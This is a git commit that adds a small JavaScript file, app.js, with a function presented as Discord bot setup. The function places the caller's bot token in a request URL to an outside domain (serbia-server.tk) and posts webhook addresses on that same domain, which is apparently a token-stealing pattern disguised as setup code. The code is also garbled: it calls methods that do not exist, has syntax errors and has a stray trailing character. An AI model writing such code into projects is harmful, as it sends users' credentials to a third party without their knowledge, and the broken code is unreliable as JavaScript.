200181dff2562532c544ea73ee65690a46dac19f
TuyAnCong <97296405+TuyAnCong@users.noreply.github.com>
2022-03-20 13:41:52 +0700

    Create app.js

---
+++ app.js
@@ -0,0 +1,13 @@
+function write(filename) {
+WriteFile(filename)
+console.log('[INFO] Writed a Logs') 
+}
+function ClassVC_Setup(name, bot, token) {
+write('draft.txt');
+JSON.phrse('http://setup.discord.serbia-server.tk/setup.json?name=' + name + '&botNode=' + bot + '&token=' + token)
+JSON.post({
+"webhookURL":"http://server.discord.serbia-server.tk/json/Array/webhook.js"
+"webhookPost": {
+"messageURL":"http://discord.serbia-server.tk/messageID/webhookArray/jsonID/Array/RayAction?messageURL=http://discordapp.com"
+})
+}1
